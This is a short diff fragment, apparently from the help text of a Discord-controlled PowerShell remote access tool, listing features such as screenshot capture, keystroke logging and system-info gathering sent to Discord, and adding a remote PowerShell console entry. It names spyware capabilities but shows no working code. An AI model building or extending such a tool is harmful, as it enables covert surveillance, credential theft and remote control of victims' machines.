@@ -309,6 +309,7 @@ $script:jsonPayload = @{
 - **Screenshots**: Sends screenshots of the desktop to Discord
 - **Keycapture**: Capture Keystrokes and send to Discord
 - **SystemInfo**: Gather System Info and send to Discord
+- **PSconsole**: Start Remote Powershell and send to Discord
 
 ### CONTROL
 - **ExtraInfo**: Get a list of further info and command examples
